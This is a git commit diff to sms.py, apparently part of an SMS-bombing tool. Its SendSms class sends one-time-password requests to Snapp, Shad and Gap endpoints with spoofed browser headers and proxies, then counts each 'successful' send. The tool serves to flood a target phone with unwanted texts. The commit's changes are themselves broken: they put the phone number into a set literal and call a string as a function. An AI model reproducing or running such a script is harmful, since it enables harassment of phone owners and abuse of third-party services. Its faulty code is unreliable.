b17b88aea4e2bbfced1435dc4c534724bc4bd083
latews1 <118557232+latews1@users.noreply.github.com>
2023-03-11 17:07:15 +0300

    Update sms.py

--- sms.py
+++ sms.py
@@ -4876,7 +4876,7 @@ class SendSms():
     def snap(self):
         #snap api
         snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
-        snapD = {"cellphone":phone}
+        snapD = {"cellphone":{self.phone}}
         try:
             snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
             if "OK" in snapR.text:
@@ -4890,7 +4890,7 @@ class SendSms():
     def shad(self):
         #shad api
         shadH = {"Host": "shadmessenger12.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://shadweb.iranlms.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://shadweb.iranlms.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
-        shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":{self.phone}("+")[1],"send_type":"SMS"}}
+        shadD = {"api_version":"3","method":"sendCode","data":{"phone_number":{self.phone}("+90")[1],"send_type":"SMS"}}
         try:
             shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD, proxies=proxy)
             if "OK" in shadR.text:
@@ -4905,7 +4905,7 @@ class SendSms():
         #gap api
         gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
         try:
-            gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(self.phone("+")[1]), headers=gapH, proxies=proxy)
+            gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(self.phone("+90")[1]), headers=gapH, proxies=proxy)
             if "OK" in gapR.text:
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gap.app")
                 self.adet += 1
